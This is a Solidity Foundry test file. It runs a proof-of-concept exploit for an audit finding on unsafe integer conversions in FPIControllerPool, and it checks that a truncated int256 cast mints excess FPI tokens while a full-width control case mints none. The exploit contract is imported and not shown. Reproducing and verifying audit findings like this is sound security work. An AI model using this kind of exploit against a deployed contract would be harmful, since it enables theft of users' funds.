// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, FPIControllerPool, MiniERC20} from "./17911-unsafe-integer-conversions-in-fpicontrollerpool-trailofbits.sol";

contract Finding17911Test is Test {
    function test_exploit_truncated_cast_mints_spare_fpi() public {
        Exploit e = new Exploit();
        e.run();

        uint256 truth = e.trueAmount();
        int256 truncated = -1000 ether;
        uint256 wrongMint = 10_000_000 ether + 1000 ether;

        assertEq(e.trueAmountSeen(), truth, "true amount");
        assertEq(e.truncated(), truncated, "truncated cast");
        assertEq(e.minted(), wrongMint, "wrong mint");
        assertEq(e.fpi().balanceOf(address(e)), wrongMint, "fpi balance");
        assertEq(e.frax().balanceOf(address(e)), truth, "frax balance");
        assertEq(e.pool().frax_borrowed_sum(), truncated, "borrowed sum");

        console2.log("true frax amount");
        console2.log(truth);
        console2.log("truncated int256 cast (absolute)");
        console2.log(uint256(1000 ether));
        console2.log("wrong FPI mint");
        console2.log(wrongMint);
    }

    function test_control_full_width_mints_nothing() public {
        Exploit e = new Exploit();
        FPIControllerPool pool = e.pool();
        uint256 truth = e.trueAmount();

        e.frax().mint(address(pool), truth);
        pool.addAMO(address(e));
        uint256 minted = pool.giveFullWidth(address(e), truth);

        assertEq(minted, 0, "full width minted");
        assertEq(pool.fullWidthRecorded(), truth, "full width dropped");
        assertEq(pool.fullWidthMinted(), 0, "control mint");
        assertEq(e.fpi().balanceOf(address(e)), 0, "fpi balance");
        assertEq(e.frax().balanceOf(address(pool)), truth, "frax stayed in the pool");

        console2.log("control recorded full width");
        console2.log(pool.fullWidthRecorded());
        console2.log("control mint");
        console2.log(minted);
    }
}
